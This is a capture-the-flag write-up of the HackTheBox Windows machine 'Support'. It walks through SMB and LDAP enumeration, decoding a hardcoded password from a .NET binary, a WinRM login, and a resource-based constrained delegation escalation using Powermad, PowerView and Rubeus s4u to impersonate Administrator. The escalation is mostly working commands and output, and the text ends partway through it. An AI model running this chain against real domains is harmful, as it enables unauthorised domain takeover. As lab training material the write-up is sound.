---
title: "HTB - Support"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - Support"
categories:
  - HTB
---

The given box ```Support``` is a Windows machine 

- [HackTheBox- Support](#hackthebox---Support)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
	  - [Autorecon Scan](#autorecon-scan)
 - [Enumeration](#enumeration)
	 - [Port 22](#port-22)
	 - [Port 80](#port-80)
 - [Initial Foothold](#initial-foothold)
 - [Privilege Escalation](#privilege-escalation)
 - [Conclusion](#conclusion)

<center>
<img src = "https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png" />
</center>

## Recon

### Nmap Scan

```shell
# Nmap 7.92 scan initiated Tue Aug 16 16:04:26 2022 as: nmap -p- -sV -sC -oN support.nmap -v 10.10.11.174
Nmap scan report for 10.10.11.174
Host is up (0.17s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-16 10:38:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
65276/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-16T10:39:19
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 16 16:10:02 2022 -- 1 IP address (1 host up) scanned in 335.59 seconds
```

## Enumeration

Enumerate all ports for interesting stuffs...

### Port 53

```shell
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/scans]
└─# dig ns @10.10.11.174 support.htb

; <<>> DiG 9.18.4-2-Debian <<>> ns @10.10.11.174 support.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62004
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.			IN	NS

;; ANSWER SECTION:
support.htb.		3600	IN	NS	dc.support.htb.

;; ADDITIONAL SECTION:
dc.support.htb.		3600	IN	A	10.10.11.174

;; Query time: 356 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (UDP)
;; WHEN: Sat Aug 20 08:44:55 IST 2022
;; MSG SIZE  rcvd: 73

┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/scans]
└─# dig mx @10.10.11.174 support.htb

; <<>> DiG 9.18.4-2-Debian <<>> mx @10.10.11.174 support.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26094
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.			IN	MX

;; AUTHORITY SECTION:
support.htb.		3600	IN	SOA	dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600

;; Query time: 176 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (UDP)
;; WHEN: Sat Aug 20 08:46:11 IST 2022
;; MSG SIZE  rcvd: 90
```

from DNS we got two domain which are  `dc.support.htb` and  `hostmaster.support.htb` but we don't port 80 open in this box so considering the found domains as Active Directory names.

### Port 88

Port 88 is of kerbrute part in order to enumerate more on this port we need more information

### Port 135

MS-RPC we didn't get any possible vulnerabilities.

### Port 139/445

```shell
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/scans]
└─# smbclient --no-pass  -L //10.10.11.174/                 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/scans]
└─# smbclient --no-pass  //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 22:31:06 2022
  ..                                  D        0  Sat May 28 16:48:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022

		4026367 blocks of size 4096. 880246 blocks available
```

From `support-tools` we had list of zip and exe files. Download all and enumerate all to get any interesting files.

Extracting UserInfo.exe.zip file we got a `UserInfo.exe` file, now we proceeding with dnSpy to disassemble to application.

![[Pasted image 20220820090300.png]]

![[Pasted image 20220820090336.png]]

![[Pasted image 20220820090355.png]]

```c#
using System;  
using System.Text;  
  
namespace UserInfo.Services  
{    
// Token: 0x02000006 RID: 6    
internal class Protected    
{        
// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318       
public static string getPassword()        
{            
byte[] array = Convert.FromBase64String(Protected.enc_password);            
byte[] array2 = array;            
for (int i = 0; i < array.Length; i++)            
{                
array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);           
}            
return Encoding.Default.GetString(array2);       
}       
// Token: 0x04000005 RID: 5       
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";        // Token: 0x04000006 RID: 6        
private static byte[] key = Encoding.ASCII.GetBytes("armando");    
}  
}
```

Here, we got the encrypted password and key of it. Now we need to decrypt it either using C# or python script.

```c#
using System;

using System.Text;

using System.Diagnostics;

  

namespace UserInfo.Services

{

    // Token: 0x02000006 RID: 6

    class supporthtb

    {

        // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318

        public static string getPassword()

        {

            byte[] array = Convert.FromBase64String(enc_password);

            byte[] array2 = array;

            for (int i = 0; i < array.Length; i++)

            {

                array2[i] = ((byte)(array[i] ^ key[i % key.Length] ^ 223));

            }

            return Encoding.Default.GetString(array2);

        }

  

        // Token: 0x04000005 RID: 5

        private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

  

        // Token: 0x04000006 RID: 6

        private static byte[] key = Encoding.ASCII.GetBytes("armando");

  

        static void Main(string[] args)

        {

            Debug.Print(getPassword());

        }

    }

}
```

Output:

`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

```python
import base64

enc_pass="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key=b"armando"

array=base64.b64decode(enc_pass)
array2=[]

for i in range(len(array)):
	array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
print(''.join(array2))
```

Output:

`python3 /Users/miN3rvA/Desktop/supporthtb_decode.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Now we got the password but don't know which user's password is this, and we have open port 389 LDAP

### Port 389

`ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"`

Decoding:

-x Simple authentication
-H LDAP Uniform Resource Identifier(s)
-D binddn  bind DN
-w passwd  bind password (for simple authentication)
-b basedn  base dn for search

```
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/loot]
└─# cat ldapusername.txt 
 krbtgt
 Domain Computers
 Domain Controllers
 Schema Admins
 Enterprise Admins
 Cert Publishers
 Domain Admins
 Domain Users
 Domain Guests
 Group Policy Creator Owners
 RAS and IAS Servers
 Allowed RODC Password Replication Group
 Denied RODC Password Replication Group
 Read-only Domain Controllers
 Enterprise Read-only Domain Controllers
 Cloneable Domain Controllers
 Protected Users
 Key Admins
 Enterprise Key Admins
 DnsAdmins
 DnsUpdateProxy
 Shared Support Accounts
 ldap
 support
 smith.rosario
 hernandez.stanley
 wilson.shelby
 anderson.damian
 thomas.raphael
 levine.leopoldo
 raven.clifton
 bardot.mary
 cromwell.gerard
 monroe.david
 west.laura
 langley.lucy
 daughtler.mabel
 stoll.rachelle
 ford.victoria
 Administrator
 Guest
```

No much information to proceed further so enumerated more,

```
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/loot]
└─# cat ldap_info.txt   
sAMAccountName: krbtgt
sAMAccountName: Domain Computers
sAMAccountName: Domain Controllers
sAMAccountName: Schema Admins
sAMAccountName: Enterprise Admins
sAMAccountName: Cert Publishers
sAMAccountName: Domain Admins
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Read-only Domain Controllers
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
 298939 for more information.
sAMAccountName: Protected Users
sAMAccountName: Key Admins
sAMAccountName: Enterprise Key Admins
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: Shared Support Accounts
sAMAccountName: ldap
info: Ironside47pleasure40Watchful
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
sAMAccountName: anderson.damian
sAMAccountName: thomas.raphael
sAMAccountName: levine.leopoldo
sAMAccountName: raven.clifton
sAMAccountName: bardot.mary
sAMAccountName: cromwell.gerard
sAMAccountName: monroe.david
sAMAccountName: west.laura
sAMAccountName: langley.lucy
sAMAccountName: daughtler.mabel
sAMAccountName: stoll.rachelle
sAMAccountName: ford.victoria
sAMAccountName: Administrator
sAMAccountName: Guest
```

Got a passwd like stuff for support user, so tried with evil-winrm

```evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'```

## Privilege Escalation

``` 
Target computer - DC
Admins on target computer - 
Fake computer name - 
Fake computer SID - 
Fake computer passwd - 
Windows 2022 Domain Controller - dc.support.htb
```

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainObject -Identity "dc=support,dc=htb"
Exception calling "Substring" with "1" argument(s): "StartIndex cannot be less than zero.
Parameter name: startIndex"
At C:\Users\support\Desktop\PowerView.ps1:6604 char:25
+ ...             $IdentityDomain = $IdentityInstance.SubString($IdentityIn ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentOutOfRangeException
Cannot validate argument on parameter 'Domain'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again.
At C:\Users\support\Desktop\PowerView.ps1:6607 char:62
+ ...               $ObjectSearcher = Get-DomainSearcher @SearcherArguments
+                                                        ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Get-DomainSearcher], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,Get-DomainSearcher


msds-isdomainfor                            : CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
lockoutobservationwindow                    : -18000000000
iscriticalsystemobject                      : True
maxpwdage                                   : -9223372036854775808
msds-alluserstrustquota                     : 1000
distinguishedname                           : DC=support,DC=htb
objectclass                                 : {top, domain, domainDNS}
pwdproperties                               : 1
gplink                                      : [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb;0]
name                                        : support
wellknownobjects                            : {B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=support,DC=htb, B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=support,DC=htb,
                                              B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=support,DC=htb, B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=support,DC=htb...}
serverstate                                 : 1
nextrid                                     : 1000
objectsid                                   : S-1-5-21-1677581083-3380853377-188903654
msds-behavior-version                       : 7
fsmoroleowner                               : CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
repluptodatevector                          : {2, 0, 0, 0...}
uascompat                                   : 0
dsasignature                                : {1, 0, 0, 0...}
ridmanagerreference                         : CN=RID Manager$,CN=System,DC=support,DC=htb
ntmixeddomain                               : 0
whenchanged                                 : 8/19/2022 9:57:33 PM
msds-perusertrusttombstonesquota            : 10
instancetype                                : 5
lockoutthreshold                            : 0
objectguid                                  : 553cd9a3-86c4-4d64-9e85-5146a98c868e
auditingpolicy                              : {0, 1}
msds-perusertrustquota                      : 1
systemflags                                 : -1946157056
objectcategory                              : CN=Domain-DNS,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata                       : 1/1/1601 12:00:00 AM
otherwellknownobjects                       : {B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=support,DC=htb, B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=support,DC=htb}
creationtime                                : 133054198539264431
whencreated                                 : 5/28/2022 11:01:46 AM
minpwdlength                                : 7
msds-nctype                                 : 0
pwdhistorylength                            : 24
dc                                          : support
msds-masteredby                             : CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
usncreated                                  : 4099
subrefs                                     : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
msds-expirepasswordsonsmartcardonlyaccounts : True
masteredby                                  : CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
lockoutduration                             : -18000000000
usnchanged                                  : 81948
modifiedcountatlastprom                     : 0
modifiedcount                               : 1
forcelogoff                                 : -9223372036854775808
ms-ds-machineaccountquota                   : 10
minpwdage                                   : -864000000000
```

from the above enumeration we got `msds-expirepasswordsonsmartcardonlyaccounts : True` and  `ms-ds-machineaccountquota                   : 10`

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainController


Forest                     : support.htb
CurrentTime                : 8/20/2022 4:21:30 AM
HighestCommittedUsn        : 82073
OSVersion                  : Windows Server 2022 Standard
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : support.htb
IPAddress                  : ::1
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {}
OutboundConnections        : {}
Name                       : dc.support.htb
Partitions                 : {DC=support,DC=htb, CN=Configuration,DC=support,DC=htb, CN=Schema,CN=Configuration,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb...}
```

`OSVersion                  : Windows Server 2022 Standard`

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> Get-NetComputer DC | Select-Object -Property name,msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC   {1, 0, 4, 128...}
```

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> import-module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Desktop> New-MachineAccount -MachineAccount FAKE02 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE02$
Verbose: [+] Distinguished Name = CN=FAKE02,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE02 added
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer fake02


pwdlastset             : 8/19/2022 9:31:23 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE02,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE02
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5102
samaccountname         : FAKE02$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 8/20/2022 4:31:23 AM
instancetype           : 4
usncreated             : 82075
objectguid             : 6ddf46b7-01a0-4cea-9591-0642df7786b3
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FAKE02, HOST/FAKE02, RestrictedKrbHost/FAKE02.support.htb, HOST/FAKE02.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FAKE02
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 8/20/2022 4:31:23 AM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 82077
dnshostname            : FAKE02.support.htb

*Evil-WinRM* PS C:\Users\support\Desktop> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5102)"
*Evil-WinRM* PS C:\Users\support\Desktop> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Desktop> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 238 19 0 0' for object 'DC$'
*Evil-WinRM* PS C:\Users\support\Desktop> Get-NetComputer DC | Select-Object -Property name,msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC   {1, 0, 4, 128...}

*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}

*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:123456 /user:fake02 /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake02
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBfake02
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 12A4243DBF12A528489DB6B90B8E0282
[*]       aes256_cts_hmac_sha1 : 44D1ADF227BFD1132A828B428AC39648E9BD038B94F1583D69A17865487612CF
[*]       des_cbc_md5          : 1C86973725CE0489

*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:fake02$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: S4U

[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'support.htb\fake02$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFUjCCBU6gAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBCUwggQhoAMCARKhAwIBAqKCBBMEggQPOCSpIaYt
      zdiAk14nqzZSVl9C7CL39KplADBxpOG7Bi1rszNevOnXjUTE8SoKJkSKG0H2f05PvQ68N3IH71bpJZqI
      m21xY85ivmjHuRrQ0PCiyCrQ1TzAA4Z0l8HFCDzO+iEitzhEtda1huUnD7o2YV5aS0bThCiiRrbg7B3V
      BLXsL2moNMY2ruBDAIpcYH1VkjZoU6/LJw0JuF50ccLrrnF76+vRGENCYWI82smcofcP7yQ6N5P2J3bY
      NUMMHaHHYW0reB803/xNemm+P4Vv7A8x47w4n8fz8rzmuP8F7K8i73EVzqnkORenOurTMHc566UDhRp4
      1Dv49vFuc2UjLCgqwmRzvOU9Rf5ZYeA/vfhtuE0XL8j7dZNg9Vor0Zh/brgFmOCi+uXUVMVMNeDWI/8x
      b/zX9deqDegD4+du2hAGueifBZDFvhduh+z515zOtAOhZD/fP+bmhOnba4Y6+g3YJFW0MQGFQXl/fxxG
      k0gQOmAlndIAH/pRd8jShvdxv+/JeuQtF70+HTeBjKt5fFVh2u8AAWNMh40kEd48Im/IPIUx6OJgOT5C
      JufqKbA13dz2tgYXE4M0WEEUwTHCFjguYkSDhf7Hw3yLve1+dtalqsSLm5wrmXbuij/dIDE/yD/bZBZ/
      VlhHFNqr11yhD7L6GnAZuEjySpEcFaUZu5EnaV/8neOzc3KQwOPn8+S2vzGA1OEGRf+X/diUg0Bnm4gq
      ISMSuqOCFOXo0XkSL8DUHrBMrPhicrKAILtKqkm42UKp73+DBWhBc6O8bJcrcNZyFnK7Fm8xz5/PJIl9
      GVHAghpo+PniiDwWqA0Olbpr/Y5bYe/Kbrxf7dB7dj+SNdBUOBhzHh3tYKpqdxt0P/D+ICR4L+t3jxxH
      1XyRLCu6xN8tWJjniNCtvN3kEHM623ty0G2gSqrIaWCh1hCNeVpq90zj/SiXgkGQIMvJej91x0S95a4c
      jbAxKAqkBekgeqJbEDFEQMeRmSH26fcvHnECvLmN1iXubVT6RPXyxi6OU/ZOwoh9D1qdBhGbqQKVqmcT
      +5O9gISn+iauffNN0e+I38WL/w4GGG8uCFQ0FhDN6FeULfG5UOHTbB6PtYrLslvxq8nL/YeFflnKKnMa
      o9LTdtPcMGvNblH3R5U/P+nNLKiqUwBahh2bFNWxq1MkK31p/345S8lALQ6V6S3XQkg2VTle+Zvq6EY1
      1dA8cROSc+imHwqnf/7s7YENPwkLIfAm15F7qAzmB3K+VFVBRL3E68nkChP+VtPRhe5DoLoPabgBHWG0
      R6W+WICGXpofMqSMDyCvKe7bG4cFgRwy3By+BfkWL5bMOZx5+eWUXZbOHzMRjzzeDKoOxwCOiIxULgB6
      vIO3bzq7r2nXAnp5SKOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEPE2
      PbXYKEM6+/7gqMEVrmihDRsLU1VQUE9SVC5IVEKiFDASoAMCAQGhCzAJGwdmYWtlMDIkowcDBQBA4QAA
      pREYDzIwMjIwODIwMDQzODI5WqYRGA8yMDIyMDgyMDE0MzgyOVqnERgPMjAyMjA4MjcwNDM4MjlaqA0b
      C1NVUFBPUlQuSFRCqSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==


[*] Action: S4U

[*] Building S4U2self request for: 'fake02$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'fake02$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      YWtlMDIk

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
